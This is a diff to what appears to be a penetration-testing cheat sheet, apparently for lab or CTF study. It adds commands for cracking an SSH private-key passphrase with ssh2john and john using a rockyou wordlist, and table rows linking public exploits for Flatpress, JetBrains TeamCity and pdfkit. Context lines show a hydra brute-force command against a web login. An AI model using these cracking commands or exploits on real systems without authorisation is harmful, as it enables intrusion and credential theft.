@@ -206,6 +206,10 @@ password guess. Use `-L userlist.txt and -p password` for password spray
 	hydra -l username -P passlist.txt 123.123.123.123 http-post-form "/login.php:userparameter=^USER^&passparameter=^PASS^:Login failed!"
 post login with specific parameters. `Login failed!` is the failure string
 
+### SSH Private key decrypt
+	ssh2john id_rsa > pkey.hash
+	john --wordlist=rockyou.txt pkey.hash
+If passphrase was requested when private key was used  
 
 ## Compromised User Access
 ### SSH
@@ -711,6 +715,9 @@ GET/POST parameters
 |ImageMagick|6.9.6-4|CVE-2023-34152|[github](https://github.com/SudoIndividual/CVE-2023-34152)|Shell will bind upon upload|
 |Lavarel|<=8.4.2|CVE-2021-3129|[github](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)|clone phpggc package to create phar, edit endpoint leading `/` if needed|
 |rpc.py|<=0.6.0|CVE-2022-35411|[github](https://github.com/CSpanias/rpc-rce.py)||
+|Flatpress|<1.3|CVE-2022-40048|[github issue](https://github.com/flatpressblog/flatpress/issues/152)||
+|JetBrains/TeamCity|<=2023.11.3|CVE-2024-27198|[rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)|Use curl command|
+|pdfkit|<=0.8.7.2|CVE-2022-25765|[exploitdb](https://www.exploit-db.com/exploits/51293)|Point to the POST endpoint|
 
 
 ## Run new shell
